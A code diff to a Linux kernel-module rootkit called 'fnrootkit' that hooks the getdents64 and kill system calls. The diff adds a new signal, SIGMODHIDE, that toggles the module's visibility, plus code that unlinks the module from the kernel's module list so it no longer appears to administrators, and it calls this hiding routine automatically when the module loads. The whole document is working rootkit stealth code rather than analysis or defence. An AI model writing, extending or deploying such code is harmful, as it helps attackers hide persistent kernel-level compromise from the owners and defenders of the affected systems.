@@ -237,6 +237,8 @@ static long khook___x64_sys_getdents64(const struct pt_regs *pt_regs) {
     return ret;
 }
 
+void toggle_module_invisability(void);
+
 KHOOK_EXT(long, __x64_sys_kill, const struct pt_regs *);
 static long khook___x64_sys_kill(const struct pt_regs *pt_regs) {
     struct task_struct *task;
@@ -253,6 +255,9 @@ static long khook___x64_sys_kill(const struct pt_regs *pt_regs) {
     case SIGINVISPORT:
         toggle_port_invisability(pid);
         break;
+    case SIGMODHIDE:
+        toggle_module_invisability();
+        break;
     default:
         KHOOK_ORIGIN(__x64_sys_kill, pt_regs);
     }
@@ -261,8 +266,35 @@ static long khook___x64_sys_kill(const struct pt_regs *pt_regs) {
 }
 
 /********************************LKM*************************************/
-static int __init fnrootkit_init(void) {
+static struct list_head *module_prev;
+static int is_module_hidden = 0;
+
+void module_hide(void) {
+    if (!is_module_hidden) {
+        module_prev = THIS_MODULE->list.prev;
+        list_del(&THIS_MODULE->list);
+
+        is_module_hidden = 1;
+    }
+}
+
+void module_show(void) {
+    if (is_module_hidden) {
+        list_add(&THIS_MODULE->list, module_prev);
+        is_module_hidden = 0;
+    }
+}
+
+void toggle_module_invisability() {
+    if (is_module_hidden)
+        module_show();
+    else
+        module_hide();
+}
+
+ int __init fnrootkit_init(void) {
     khook_init();
+    module_hide();
 
     printk(KERN_INFO "fnrootkit: module have loaded.\n");
 
